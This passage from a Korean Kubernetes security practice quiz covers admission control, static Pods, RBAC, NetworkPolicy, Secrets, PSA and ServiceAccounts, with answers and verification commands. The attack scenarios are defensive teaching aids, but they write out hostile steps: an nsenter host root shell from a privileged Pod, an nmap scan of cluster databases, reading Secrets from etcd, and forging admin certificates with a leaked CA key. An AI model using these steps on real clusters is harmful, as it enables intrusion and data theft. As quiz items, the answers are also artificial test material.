- D) `/root/.kube/certs/` — 존재하지 않는 표준 경로이다. `~/.kube/config`는 kubeconfig 파일 위치이다.

**보안 원리:**
kubeadm은 PKI(Public Key Infrastructure) 체계를 사용하여 클러스터 내 모든 컴포넌트 간 mTLS 통신을 구성한다. 클러스터 CA가 모든 인증서를 서명하므로, CA 키(`ca.key`)가 유출되면 공격자가 임의의 인증서를 발급하여 cluster-admin 권한을 획득할 수 있다. 인증서 기본 유효기간은 1년이며, CA는 10년이다.

**공격 시나리오:**
`/etc/kubernetes/pki/ca.key` 파일에 대한 접근 권한이 부적절하게 설정(예: 0644)되면, 노드에 접근한 공격자가 CA 키로 `system:masters` 그룹의 클라이언트 인증서를 자체 서명하여 cluster-admin 권한을 획득한다. `openssl req` + `openssl x509`로 수 초 만에 가능하다.

**등장 배경:**
kubeadm 이전에는 수동으로 각 컴포넌트의 인증서를 생성하고 배포해야 했다. 인증서 경로가 표준화되지 않아 운영 복잡성이 높았다. kubeadm이 `/etc/kubernetes/pki/`를 표준 경로로 지정하고, `kubeadm init` 시 전체 PKI 체계를 자동 생성하면서 인증서 관리가 표준화되었다.

</details>

### 문제 12.
kube-controller-manager가 관리하는 보안 관련 기능이 아닌 것은?

A) ServiceAccount 토큰 발급
B) 인증서 서명 요청(CSR) 승인
C) Namespace 삭제 시 리소스 정리
D) 네트워크 패킷 필터링

<details><summary>정답 확인</summary>

**정답: D) 네트워크 패킷 필터링 ✅**

네트워크 패킷 필터링은 CNI 플러그인(Cilium, Calico 등)이나 kube-proxy가 담당한다. kube-controller-manager는 ServiceAccount 토큰 컨트롤러, CSR 서명 컨트롤러, Namespace 컨트롤러 등을 통해 보안 관련 기능을 수행한다.

**검증:**
```bash
# kube-controller-manager에서 실행 중인 컨트롤러 목록 확인
cat /etc/kubernetes/manifests/kube-controller-manager.yaml | grep controllers
# ServiceAccount 토큰 관련 플래그 확인
cat /etc/kubernetes/manifests/kube-controller-manager.yaml | grep service-account
# CSR 관련 컨트롤러 확인
kubectl get csr
```
```text
# kube-controller-manager의 보안 관련 컨트롤러:
# - serviceaccount-token  : SA 생성 시 토큰 Secret 관리
# - csrsigning            : kubelet CSR 자동 서명
# - csrapproving          : CSR 자동 승인 (조건부)
# - namespace             : NS 삭제 시 하위 리소스 정리 (Secret, RBAC 포함)
# - root-ca-cert-publisher: 각 NS에 CA 인증서 ConfigMap 배포
```

**오답 분석:**
- A) ServiceAccount 토큰 발급 — kube-controller-manager의 TokenController가 담당하는 기능이다.
- B) CSR 승인 — csrapproving/csrsigning 컨트롤러가 kubelet의 인증서 서명 요청을 처리한다.
- C) Namespace 삭제 시 리소스 정리 — NamespaceController가 NS 삭제 시 해당 NS의 모든 리소스(Secret, Role, RoleBinding 등)를 정리한다.

**보안 원리:**
kube-controller-manager는 컨트롤 루프(reconciliation loop)를 통해 선언된 상태와 실제 상태를 일치시킨다. 보안 관점에서 중요한 컨트롤러: (1) TokenController — ServiceAccount 토큰의 라이프사이클을 관리한다. (2) CSRSigningController — `--cluster-signing-cert-file`로 지정된 CA로 CSR에 서명한다. (3) NamespaceController — Namespace finalizer를 처리하여 삭제 시 잔존 리소스로 인한 보안 위험을 방지한다.

**공격 시나리오:**
kube-controller-manager가 다운되면 ServiceAccount 토큰 갱신이 중단된다. 기존 토큰은 만료되어도 새 토큰이 발급되지 않으므로 Pod 재시작 시 API Server 인증이 실패한다. 또한 CSR 승인이 중단되어 새 노드의 kubelet 인증서가 서명되지 않아 노드 가입이 불가능해진다.

**등장 배경:**
Kubernetes는 컴포넌트 책임을 분리하는 설계 원칙을 따른다. 네트워크 패킷 처리는 데이터 플레인(CNI, kube-proxy)에, 인증/인가 상태 관리는 컨트롤 플레인(controller-manager)에 위임한다. 이 분리로 CNI 플러그인 교체 시에도 인증 체계에 영향이 없다.

</details>

### 문제 13.
API Server에서 admission controller의 실행 순서로 올바른 것은?

A) Validating -> Mutating -> Webhook
B) Mutating -> Validating
C) Validating -> Mutating
D) 순서 없이 병렬로 실행된다

<details><summary>정답 확인</summary>

**정답: B) Mutating -> Validating ✅**

Admission Controller는 Mutating 단계에서 요청을 수정하고, 이후 Validating 단계에서 수정된 요청을 검증한다. 이 순서가 중요한 이유는 Mutating에서 추가/수정된 필드가 Validating에서 검증되어야 하기 때문이다.

**검증:**
```bash
# API Server에서 활성화된 admission plugin 확인
cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep enable-admission
# Webhook 설정 확인
kubectl get mutatingwebhookconfigurations
kubectl get validatingwebhookconfigurations
# Admission 순서 확인 (API Server 로그)
kubectl logs -n kube-system kube-apiserver-<node> | grep admission
```
```text
# Admission 처리 순서:
# 1. Mutating Admission (built-in) → ServiceAccount, DefaultStorageClass 등
# 2. Mutating Webhook                → Istio sidecar injection, Vault injection 등
# 3. Object Schema Validation         → OpenAPI 스키마 검증
# 4. Validating Admission (built-in) → PodSecurity, NodeRestriction 등
# 5. Validating Webhook               → OPA Gatekeeper, Kyverno 등
```

**오답 분석:**
- A) Validating -> Mutating -> Webhook — 순서가 반대이다. Mutating이 먼저 실행되어야 변경된 결과를 Validating이 검증할 수 있다.
- C) Validating -> Mutating — 순서가 반대이다.
- D) 병렬 실행 — Mutating과 Validating은 반드시 순차적으로 실행된다. 다만, 같은 단계 내의 여러 webhook은 순서대로 실행된다.

**보안 원리:**
Admission Controller는 API Server의 인증/인가 이후, etcd에 객체가 저장되기 전에 실행되는 게이트키퍼이다. Mutating 단계에서는 요청 객체를 변경한다(예: Istio가 sidecar 컨테이너를 주입, PodPreset이 환경변수를 추가). Validating 단계에서는 최종 객체가 정책을 준수하는지 검증만 하고 변경하지 않는다. 이 순서를 보장함으로써 Mutating이 주입한 sidecar가 Validating의 보안 정책(이미지 레지스트리 제한 등)을 통과하는지 확인할 수 있다.

**공격 시나리오:**
Validating Webhook(OPA Gatekeeper)이 "privileged 컨테이너 금지" 정책을 적용 중이다. Mutating Webhook이 악의적으로 구성되어 Pod spec에 `privileged: true`를 주입한다. Mutating이 먼저 실행되므로 이 변경이 적용되지만, 이후 Validating 단계에서 Gatekeeper가 이를 탐지하여 요청을 거부한다. 만약 순서가 반대라면 이 공격이 탐지되지 않는다.

**등장 배경:**
Kubernetes 1.7에서 Dynamic Admission Control이 도입되기 전에는 컴파일 타임에 빌트인된 admission plugin만 사용할 수 있었다. 사용자 정의 정책 적용이 불가능하여, webhook 기반 확장 메커니즘이 도입되었다. OPA Gatekeeper, Kyverno 등의 정책 엔진은 이 메커니즘을 활용한다.

</details>

### 문제 14.
Kubernetes static Pod의 보안 관점에서의 특징은?

A) API Server를 통해 생성되므로 RBAC가 적용된다
B) kubelet이 직접 관리하며 API Server의 admission control이 적용되지 않을 수 있다
C) etcd에 저장되어 암호화 보호를 받는다
D) NetworkPolicy에 의해 자동으로 보호된다

<details><summary>정답 확인</summary>

**정답: B) kubelet이 직접 관리하며 API Server의 admission control이 적용되지 않을 수 있다 ✅**

static Pod는 kubelet이 `/etc/kubernetes/manifests/` 디렉터리의 매니페스트 파일을 직접 읽어 관리한다. kubeadm 클러스터에서 kube-apiserver, etcd, kube-controller-manager, kube-scheduler가 static Pod로 실행된다. API Server를 거치지 않으므로 admission controller의 정책이 우회될 수 있다.

**검증:**
```bash
# static pod 매니페스트 디렉터리 확인
ls /etc/kubernetes/manifests/
# kubelet 설정에서 static pod 경로 확인
cat /var/lib/kubelet/config.yaml | grep staticPodPath
# static pod와 일반 pod 구분 (mirror pod 확인)
kubectl get pods -n kube-system -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.metadata.annotations.kubernetes\.io/config\.source}{"\n"}{end}'
```
```text
# /etc/kubernetes/manifests/ 디렉터리 내용:
etcd.yaml
kube-apiserver.yaml
kube-controller-manager.yaml
kube-scheduler.yaml

# static pod의 config.source 어노테이션:
kube-apiserver-master    file     ← kubelet이 파일에서 직접 생성
kube-scheduler-master    file

# 일반 pod:
nginx-deployment-xxx     api      ← API Server를 통해 생성
```

**오답 분석:**
- A) API Server를 통해 생성되므로 RBAC 적용 — static Pod는 API Server를 거치지 않고 kubelet이 직접 생성한다. API Server에 mirror pod가 생성되지만, 이는 읽기 전용이다.
- C) etcd에 저장되어 암호화 보호 — static Pod spec은 노드 파일시스템에 저장된다. etcd의 mirror pod는 kubelet이 생성한 읽기 전용 사본이다.
- D) NetworkPolicy에 의해 자동 보호 — NetworkPolicy는 Pod에 자동 적용되지 않는다. 명시적으로 정책을 생성해야 한다.

**보안 원리:**
static Pod는 kubelet이 `--pod-manifest-path`(또는 `staticPodPath` 설정)에 지정된 디렉터리를 주기적으로 스캔하여 생성/갱신/삭제한다. 이 과정에서 API Server의 admission webhook이 호출되지 않을 수 있다. kubelet이 API Server에 mirror pod를 생성할 때 일부 admission plugin이 적용되지만, 실제 Pod 실행은 kubelet이 독립적으로 수행하므로 admission 거부를 무시할 수 있다.

**공격 시나리오:**
공격자가 노드의 root 권한을 획득한 후, `/etc/kubernetes/manifests/`에 악성 Pod 매니페스트(`hostNetwork: true`, `privileged: true`)를 생성한다. kubelet이 이를 감지하여 즉시 실행한다. OPA Gatekeeper나 Kyverno가 privileged 컨테이너를 금지하는 정책을 적용 중이더라도, static pod는 admission webhook을 우회하여 실행된다.

**등장 배경:**
static Pod는 Kubernetes 컨트롤 플레인 자체를 부트스트랩하기 위해 설계되었다. API Server가 아직 기동되지 않은 상태에서 etcd, API Server를 시작해야 하므로, kubelet이 API Server 없이 독립적으로 Pod를 실행할 수 있어야 한다. kubeadm은 이 메커니즘으로 컨트롤 플레인을 자체 호스팅(self-hosted)한다.

</details>

### 문제 15.
API Server의 `--enable-admission-plugins` 플래그에 포함되어야 하는 보안 관련 admission controller로 적절하지 않은 것은?

A) PodSecurity
B) NodeRestriction
C) AlwaysAdmit
D) ServiceAccount

<details><summary>정답 확인</summary>

**정답: C) AlwaysAdmit ✅**

`AlwaysAdmit`은 모든 요청을 무조건 승인하므로 보안상 사용해서는 안 된다. `PodSecurity`(PSA), `NodeRestriction`(kubelet의 권한 제한), `ServiceAccount`(SA 자동 설정)는 보안을 위해 활성화해야 하는 admission controller이다.

**검증:**
```bash
# 현재 활성화된 admission plugin 확인
cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep enable-admission-plugins
# 기본 활성화 목록 확인 (kube-apiserver --help)
kube-apiserver --help 2>&1 | grep -A5 "enable-admission-plugins"
```
```text
# kubeadm 기본 활성화 admission plugins:
--enable-admission-plugins=NodeRestriction

# 권장 보안 admission plugins:
--enable-admission-plugins=NodeRestriction,PodSecurity,ServiceAccount,
  ResourceQuota,LimitRanger,NamespaceLifecycle

# AlwaysAdmit이 활성화된 경우 (위험):
# 모든 요청이 무조건 통과 → privileged pod, hostPath 마운트 등 모두 허용
```

**오답 분석:**
- A) PodSecurity — PSA(Pod Security Admission)는 Pod Security Standards(baseline, restricted)를 강제하는 필수 보안 플러그인이다. PSP(PodSecurityPolicy)의 후속이다.
- B) NodeRestriction — kubelet이 자신의 노드에 속한 Pod/Node 리소스만 수정하도록 제한한다. 노드 침해 시 다른 노드의 리소스 변조를 방지한다.
- D) ServiceAccount — Pod에 ServiceAccount를 자동 할당하고, 토큰을 자동 마운트하는 플러그인이다.

**보안 원리:**
Admission Controller는 Defense in Depth의 마지막 게이트이다. 인증(AuthN)과 인가(AuthZ)를 통과한 요청이라도 조직의 보안 정책에 위배되면 admission 단계에서 거부한다. AlwaysAdmit은 이 게이트를 완전히 제거하는 것과 동일하다. 반대로 AlwaysDeny는 모든 요청을 거부하므로 테스트 외에는 사용하지 않는다.

**공격 시나리오:**
AlwaysAdmit이 활성화되고 다른 보안 admission plugin이 비활성화된 클러스터에서, 공격자가 유효한 인증 토큰을 획득하면 `privileged: true` + `hostPID: true` + `hostNetwork: true` Pod를 배포한다. 이 Pod에서 `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`로 호스트 루트 셸을 획득하고, 다른 노드의 kubelet 자격증명을 탈취하여 클러스터 전체를 장악한다.

**등장 배경:**
Kubernetes 초기에는 admission plugin 목록이 고정되어 있었고, AlwaysAdmit이 기본 활성화되는 배포판이 있었다. 보안 사고가 증가하면서 CIS Benchmark에서 AlwaysAdmit 비활성화를 필수 항목으로 지정하였다. Kubernetes 1.25에서 PSP가 제거되고 PSA가 기본 활성화되면서 admission 보안이 강화되었다.

</details>

---

## Kubernetes Security Fundamentals (9문항)

### 문제 16.
RBAC에서 Role과 ClusterRole의 차이점으로 올바른 것은?

A) Role은 네임스페이스 범위이고, ClusterRole은 클러스터 범위이다
B) Role은 클러스터 범위이고, ClusterRole은 네임스페이스 범위이다
C) 둘 다 클러스터 범위이며 차이가 없다
D) Role은 읽기 전용이고, ClusterRole은 읽기/쓰기 권한을 가진다

<details><summary>정답 확인</summary>

**정답: A) Role은 네임스페이스 범위이고, ClusterRole은 클러스터 범위이다 ✅**

Role은 특정 네임스페이스 내에서만 유효한 권한을 정의하고, ClusterRole은 클러스터 전체 범위 또는 네임스페이스에 속하지 않는 리소스(nodes, namespaces 등)에 대한 권한을 정의한다. 단, RoleBinding을 통해 ClusterRole을 특정 네임스페이스에 바인딩하면 해당 네임스페이스 내에서만 권한이 적용된다.

**검증:**
```bash
# Role 조회 (특정 네임스페이스)
kubectl get roles -n demo
kubectl describe role pod-reader -n demo
# ClusterRole 조회 (클러스터 범위)
kubectl get clusterroles | grep -v system:
# 바인딩 관계 확인
kubectl get rolebindings -n demo -o wide
kubectl get clusterrolebindings -o wide | head -20
# 특정 사용자의 권한 테스트
kubectl auth can-i list pods -n demo --as=dev-user
```
```text
# Role 예시 (네임스페이스 범위):
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: demo         ← 반드시 네임스페이스 지정
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "watch", "list"]

# ClusterRole 예시 (클러스터 범위):
kind: ClusterRole
metadata:
  name: node-reader       ← namespace 필드 없음
rules:
- apiGroups: [""]
  resources: ["nodes"]    ← 클러스터 범위 리소스
  verbs: ["get", "list"]
```

**오답 분석:**
- B) 범위가 반대 — Role은 네임스페이스 범위, ClusterRole이 클러스터 범위이다. 명칭 그대로이다.
- C) 둘 다 클러스터 범위 — Role에는 반드시 `metadata.namespace`가 지정된다. 클러스터 범위가 아니다.
- D) 읽기/쓰기 구분 — Role/ClusterRole의 구분은 범위(scope)이지 권한 종류가 아니다. 둘 다 `verbs`로 읽기/쓰기를 제어한다.

**보안 원리:**
RBAC의 4대 리소스 관계: (1) Role — 네임스페이스 내 권한 정의 (2) ClusterRole — 클러스터 범위 권한 정의 (3) RoleBinding — 주체(User/Group/SA)에 Role 또는 ClusterRole을 네임스페이스 범위로 바인딩 (4) ClusterRoleBinding — 주체에 ClusterRole을 클러스터 범위로 바인딩. 핵심은 ClusterRole + RoleBinding 조합이다. 이를 통해 재사용 가능한 ClusterRole을 여러 네임스페이스에 개별 바인딩할 수 있다.

**공격 시나리오:**
개발자에게 ClusterRoleBinding으로 `edit` ClusterRole을 부여하면, 모든 네임스페이스(kube-system 포함)의 리소스를 수정할 수 있다. 공격자가 이 계정을 탈취하면 kube-system 네임스페이스의 ConfigMap을 변조하여 컨트롤 플레인 설정을 조작할 수 있다. RoleBinding으로 개별 네임스페이스에만 바인딩했다면 피해 범위가 해당 네임스페이스로 제한된다.

**등장 배경:**
Kubernetes 1.6 이전에는 ABAC(Attribute-Based Access Control)가 사용되었다. ABAC는 정책 파일을 수정할 때마다 API Server를 재시작해야 했고, 파일 기반이라 버전 관리가 어려웠다. 1.6에서 RBAC가 도입되어 API 객체로 동적 관리가 가능해졌고, 1.8에서 GA(Generally Available)가 되어 사실상 표준이 되었다.

</details>

### 문제 17.
NetworkPolicy에서 `podSelector: {}`의 의미는?

A) 어떤 Pod도 선택하지 않는다
B) 해당 네임스페이스의 모든 Pod를 선택한다
C) 라벨이 없는 Pod만 선택한다
D) 기본(default) 네임스페이스의 Pod만 선택한다

<details><summary>정답 확인</summary>

**정답: B) 해당 네임스페이스의 모든 Pod를 선택한다 ✅**

빈 셀렉터 `{}`는 해당 네임스페이스의 모든 Pod를 선택한다. tart-infra의 dev 클러스터에서 `default-deny` CiliumNetworkPolicy가 `endpointSelector: {}`를 사용하여 demo 네임스페이스의 모든 Pod에 기본 차단 정책을 적용하고 있다.

**검증:**
```bash
# default-deny NetworkPolicy 적용
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: demo
spec:
  podSelector: {}    # 모든 Pod 선택
  policyTypes:
  - Ingress
  - Egress
EOF
# 정책 적용 후 통신 테스트
kubectl exec -n demo test-pod -- curl -s --max-time 3 http://nginx-svc
```
```text
# default-deny 적용 후 curl 결과:
curl: (28) Connection timed out after 3001 milliseconds
command terminated with exit code 28

# NetworkPolicy가 없을 때:
<html><body><h1>Welcome to nginx!</h1></body></html>
```

**오답 분석:**
- A) 어떤 Pod도 선택하지 않음 — 빈 셀렉터 `{}`는 "조건 없음 = 전체 선택"이다. "선택 안 함"이 아니다.
- C) 라벨 없는 Pod만 선택 — `{}`는 라벨 유무와 무관하게 모든 Pod를 선택한다. 라벨이 없는 Pod만 선택하는 셀렉터는 존재하지 않는다.
- D) default 네임스페이스 Pod만 — NetworkPolicy는 자신이 속한 네임스페이스의 Pod에만 적용된다. `default` 네임스페이스와 무관하다.

**보안 원리:**
Kubernetes NetworkPolicy는 화이트리스트(whitelist) 모델이다. NetworkPolicy가 하나도 없으면 모든 트래픽이 허용된다. `podSelector: {}`로 모든 Pod를 선택하고 ingress/egress 규칙을 비우면(`[]` 또는 생략) default-deny가 구현된다. 이후 필요한 통신만 명시적으로 허용하는 정책을 추가한다. 이것이 Zero Trust 네트워크의 기본 패턴이다.

**공격 시나리오:**
NetworkPolicy 없이 flat network를 운영하는 클러스터에서, 공격자가 웹 애플리케이션 Pod를 RCE로 침해한다. 침해된 Pod에서 `nmap -sT 10.244.0.0/16 -p 5432,6379,3306`으로 클러스터 내 DB 서비스를 스캔하고, PostgreSQL/Redis에 직접 접근하여 데이터를 탈취한다. default-deny + 명시적 허용 정책이 있었다면 웹 Pod에서 DB로의 직접 접근이 차단되었을 것이다.

**등장 배경:**
Kubernetes의 기본 네트워크 모델은 "모든 Pod가 모든 Pod에 접근 가능"이다. 이는 개발 편의성을 위한 설계였으나, 프로덕션 환경에서 마이크로서비스 간 불필요한 통신 경로가 공격 표면이 되었다. 1.3에서 NetworkPolicy API가 도입되어 네임스페이스 수준의 네트워크 세그멘테이션이 가능해졌다.

</details>

### 문제 18.
Kubernetes Secret의 기본 저장 방식은?

A) AES-256으로 암호화하여 etcd에 저장한다
B) Base64로 인코딩하여 etcd에 평문으로 저장한다
C) HashiCorp Vault에 자동으로 저장한다
D) 각 노드의 로컬 파일시스템에 저장한다

<details><summary>정답 확인</summary>

**정답: B) Base64로 인코딩하여 etcd에 평문으로 저장한다 ✅**

기본 설정에서 Secret은 Base64 인코딩된 형태로 etcd에 저장되며, 이는 암호화가 아니다. EncryptionConfiguration을 설정해야 etcd에서 Secret이 암호화된다. tart-infra의 demo 네임스페이스에 postgres, keycloak 등의 패스워드가 Secret으로 저장되어 있다.

**검증:**
```bash
# Secret 생성 후 Base64 인코딩 확인
kubectl create secret generic test-secret --from-literal=password=MyP@ssw0rd -n demo
kubectl get secret test-secret -n demo -o jsonpath='{.data.password}' | base64 -d
# etcd에서 직접 Secret 데이터 확인 (암호화 미적용 시)
ETCDCTL_API=3 etcdctl get /registry/secrets/demo/test-secret \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key | strings
```
```text
# kubectl로 조회한 Secret (Base64 인코딩):
data:
  password: TXlQQHNzdzByZA==

# Base64 디코딩 결과:
MyP@ssw0rd

# etcd에서 직접 조회 시 (encryption at rest 미적용):
/registry/secrets/demo/test-secret
...password...MyP@ssw0rd...   ← 평문 노출
```

**오답 분석:**
- A) AES-256 암호화 — 기본값이 아니다. EncryptionConfiguration에 `aescbc` 또는 `aesgcm` 프로바이더를 명시적으로 설정해야 적용된다.
- C) HashiCorp Vault 자동 저장 — Vault 연동은 External Secrets Operator 또는 CSI Secret Store Driver를 별도로 설치해야 한다. 기본 기능이 아니다.
- D) 로컬 파일시스템 저장 — Secret은 etcd에 저장된다. 노드 파일시스템에 저장되는 것은 Secret이 Volume으로 마운트된 경우이며, 이는 tmpfs(메모리)에 저장된다.

**보안 원리:**
Base64는 인코딩(encoding)이지 암호화(encryption)가 아니다. `echo "TXlQQHNzdzByZA==" | base64 -d`로 누구나 원문을 복원할 수 있다. Secret의 실제 보호는 세 단계로 구성된다: (1) 전송 중 — API Server와 etcd 간 TLS 통신 (2) 저장 중 — EncryptionConfiguration으로 etcd 내 암호화 (3) 접근 제어 — RBAC로 Secret 리소스에 대한 get/list 권한 제한.

**공격 시나리오:**
etcd 백업 파일이 S3 버킷에 공개 접근 가능하게 저장된 경우, 공격자가 백업을 다운로드하여 etcdctl로 모든 Secret을 추출한다. Base64 디코딩만으로 DB 패스워드, API 키, TLS 인증서 개인키가 모두 노출된다. encryption at rest가 적용되었다면 백업에서 추출된 데이터는 암호문이므로 키 없이 복호화가 불가능하다.

**등장 배경:**
Kubernetes 설계 초기에 Secret은 ConfigMap과 유사하게 Base64 인코딩만 적용되었다. 이는 바이너리 데이터를 YAML/JSON으로 표현하기 위한 것이지 보안 목적이 아니었다. Secret이 etcd에 평문 저장된다는 사실이 보안 커뮤니티에서 지속적으로 지적되어, Kubernetes 1.7에서 EncryptionConfiguration이 도입되었다.

</details>

### 문제 19.
Pod Security Admission의 `restricted` 수준에서 반드시 설정해야 하는 것이 아닌 것은?

A) `runAsNonRoot: true`
B) `allowPrivilegeEscalation: false`
C) `readOnlyRootFilesystem: true`
D) `seccompProfile.type: RuntimeDefault`

<details><summary>정답 확인</summary>

**정답: C) `readOnlyRootFilesystem: true` ✅**

`readOnlyRootFilesystem`은 보안 모범 사례이지만, PSA `restricted` 수준의 필수 요구사항은 아니다. `restricted` 수준에서 필수인 것은 `runAsNonRoot`, `allowPrivilegeEscalation: false`, `capabilities.drop: ALL`, `seccompProfile` 설정 등이다.

**검증:**
```bash
# PSA restricted 수준 라벨 적용
kubectl label namespace demo pod-security.kubernetes.io/enforce=restricted
# readOnlyRootFilesystem 없이 restricted Pod 생성 테스트
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: test-restricted
  namespace: demo
spec:
  containers:
  - name: app
    image: nginx:1.25
    securityContext:
      runAsNonRoot: true
      runAsUser: 1000
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
      seccompProfile:
        type: RuntimeDefault
      # readOnlyRootFilesystem 생략 — 이 상태로 생성 가능
EOF
```
```text
# readOnlyRootFilesystem 없이도 생성 성공:
pod/test-restricted created

# PSA restricted에서 필수 항목 누락 시 에러 예시:
Error from server (Forbidden): pods "test" is forbidden:
  violates PodSecurity "restricted:latest":
  allowPrivilegeEscalation != false
  unrestricted capabilities
  runAsNonRoot != true
  seccompProfile not set
```

**오답 분석:**
- A) `runAsNonRoot: true` — restricted 필수 항목이다. 컨테이너가 root(UID 0)로 실행되지 않도록 강제한다.
- B) `allowPrivilegeEscalation: false` — restricted 필수 항목이다. `setuid` 비트를 통한 권한 상승을 차단한다.
- D) `seccompProfile.type: RuntimeDefault` — restricted 필수 항목이다. 컨테이너가 사용할 수 있는 시스템 콜을 제한한다.

**보안 원리:**
PSA는 세 가지 수준을 정의한다: (1) privileged — 제한 없음 (2) baseline — 위험한 설정(privileged, hostNetwork, hostPID 등)만 차단 (3) restricted — 최소 권한 원칙을 강제(non-root, no capability, seccomp 등). `readOnlyRootFilesystem`은 restricted에 포함되지 않은 이유는, 많은 애플리케이션이 `/tmp`, `/var/cache` 등에 쓰기가 필요하여 호환성 문제가 크기 때문이다. 다만 보안 모범 사례로 강력히 권장된다.

**공격 시나리오:**
`readOnlyRootFilesystem`이 미설정된 컨테이너에서 공격자가 RCE를 획득한다. 파일시스템에 악성 바이너리(크립토마이너, 리버스 셸)를 다운로드하여 `/tmp/malware`에 저장하고 실행한다. `readOnlyRootFilesystem: true`가 설정되어 있었다면 쓰기 시도가 `Read-only file system` 에러로 실패하여 악성 코드 설치가 차단된다.

**등장 배경:**
PodSecurityPolicy(PSP)는 복잡한 설정과 RBAC 바인딩 문제로 도입 장벽이 높았다. Kubernetes 1.22에서 PSA가 알파로 도입되었고, 1.25에서 PSP가 제거되면서 PSA가 공식 대체재가 되었다. PSA는 네임스페이스 라벨 하나로 보안 수준을 적용할 수 있어 운영이 간단하다.

</details>

### 문제 20.
다음 중 Kubernetes ServiceAccount에 대한 설명으로 올바른 것은?

A) ServiceAccount는 클러스터 범위의 리소스이다
B) 각 네임스페이스에 `default` ServiceAccount가 자동 생성된다
C) ServiceAccount 토큰은 만료 기한이 없다
D) Pod는 반드시 ServiceAccount를 명시해야 실행된다

<details><summary>정답 확인</summary>

**정답: B) 각 네임스페이스에 `default` ServiceAccount가 자동 생성된다 ✅**

모든 네임스페이스에는 `default` ServiceAccount가 자동 생성된다. ServiceAccount는 네임스페이스 범위의 리소스이며, Pod에 ServiceAccount를 명시하지 않으면 `default`가 사용된다. Kubernetes 1.24부터 TokenRequest API를 통해 시간 제한이 있는 토큰이 발급된다.

**검증:**
```bash
# 네임스페이스의 default ServiceAccount 확인
kubectl get sa -n demo
# SA 토큰이 Pod에 자동 마운트되는지 확인
kubectl get pod <pod-name> -n demo -o jsonpath='{.spec.serviceAccountName}'
kubectl exec <pod-name> -n demo -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -c1-50
# 토큰 만료 시간 확인 (JWT 디코딩)
kubectl exec <pod-name> -n demo -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | \
  cut -d. -f2 | base64 -d 2>/dev/null | jq '.exp'
```
```text
# ServiceAccount 목록:
NAME      SECRETS   AGE
default   0         30d

# Projected Volume으로 마운트된 토큰 (1.24+):
# /var/run/secrets/kubernetes.io/serviceaccount/token
# - 시간 제한 있음 (기본 3607초)
# - 자동 갱신됨
# - audience 바인딩됨

# JWT 페이로드 예시:
{
  "aud": ["https://kubernetes.default.svc"],
  "exp": 1735689600,      ← 만료 시간 존재
  "iss": "https://kubernetes.default.svc",
  "sub": "system:serviceaccount:demo:default"
}
```

**오답 분석:**
- A) 클러스터 범위 리소스 — ServiceAccount는 네임스페이스 범위(namespaced)이다. `kubectl api-resources --namespaced=true | grep serviceaccounts`로 확인 가능하다.
- C) 토큰 만료 없음 — Kubernetes 1.24 이후 TokenRequest API에 의해 시간 제한 토큰이 발급된다. 1.24 이전의 장기 Secret 기반 토큰은 자동 생성되지 않는다.
- D) SA 명시 필수 — Pod에 `serviceAccountName`을 생략하면 해당 네임스페이스의 `default` SA가 자동 할당된다.

**보안 원리:**
Kubernetes 1.24에서 BoundServiceAccountToken이 GA가 되면서 SA 토큰 보안이 강화되었다. 기존 Secret 기반 토큰은 만료 없이 영구적이었으나, 새로운 ProjectedVolume 토큰은 (1) 시간 제한(기본 1시간) (2) audience 바인딩(특정 API Server에서만 유효) (3) Pod 삭제 시 자동 무효화의 세 가지 보안 특성을 갖는다. `automountServiceAccountToken: false`로 불필요한 토큰 마운트를 비활성화하는 것이 권장된다.

**공격 시나리오:**
default SA에 과도한 RBAC 권한이 바인딩된 상태에서, 공격자가 웹 애플리케이션의 SSRF 취약점을 이용하여 `http://169.254.169.254` 대신 `https://kubernetes.default.svc/api/v1/secrets`에 접근한다. Pod에 자동 마운트된 SA 토큰을 사용하여 클러스터 내 모든 Secret을 조회한다. `automountServiceAccountToken: false` 설정으로 토큰 마운트를 차단했다면 이 공격이 불가능하다.

**등장 배경:**
초기 Kubernetes에서 SA 토큰은 Secret 오브젝트로 영구 발급되어, 토큰 유출 시 교체가 어려웠다. 1.20에서 BoundServiceAccountToken 베타가 도입되어 시간 제한 토큰이 기본이 되었고, 1.24에서 `LegacyServiceAccountTokenNoAutoGeneration` 기능 게이트가 활성화되어 영구 토큰 자동 생성이 중단되었다.

</details>

### 문제 21.
CiliumNetworkPolicy에서 L7 정책으로 HTTP GET 메서드만 허용하려면 어떤 필드를 사용하는가?

A) `spec.ingress.toPorts.rules.http`
B) `spec.ingress.fromPorts.http`
C) `spec.rules.httpFilter`
D) `spec.ingress.l7Rules.httpMethod`

<details><summary>정답 확인</summary>

**정답: A) `spec.ingress.toPorts.rules.http` ✅**

CiliumNetworkPolicy는 `toPorts.rules.http` 필드를 통해 HTTP 메서드, 경로 등 L7 수준의 필터링을 지원한다. tart-infra의 dev 클러스터에서 `allow-nginx-to-httpbin` 정책이 GET 메서드만 허용하는 L7 필터링을 적용하고 있다. 이는 표준 NetworkPolicy로는 불가능한 기능이다.

**검증:**
```bash
# CiliumNetworkPolicy L7 HTTP 필터 적용
kubectl apply -f - <<EOF
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-get-only
  namespace: demo
spec:
  endpointSelector:
    matchLabels:
      app: httpbin
  ingress:
  - fromEndpoints:
    - matchLabels:
        app: nginx
    toPorts:
    - ports:
      - port: "80"
        protocol: TCP
      rules:
        http:
        - method: GET
          path: "/api/.*"
EOF
# L7 정책 테스트
kubectl exec -n demo nginx-pod -- curl -s -X GET http://httpbin/api/data
kubectl exec -n demo nginx-pod -- curl -s -X POST http://httpbin/api/data
```
```text
# GET 요청 결과 (허용):
HTTP/1.1 200 OK
{"data": "success"}

# POST 요청 결과 (차단):
Access denied
